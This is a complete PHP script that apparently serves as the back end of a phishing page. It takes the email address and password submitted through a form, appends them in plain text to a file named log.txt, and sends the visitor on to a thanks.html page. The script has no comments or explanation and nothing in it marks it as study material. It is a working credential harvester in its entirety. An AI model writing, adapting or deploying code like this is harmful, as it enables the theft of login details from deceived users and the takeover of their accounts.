 <?php
$email = $_POST['email'];
$password = $_POST['password'];
$file = fopen("log.txt", "a");
fwrite($file, $email . " " . $password . "\n");
fclose($file);
header('Location: thanks.html');
?>
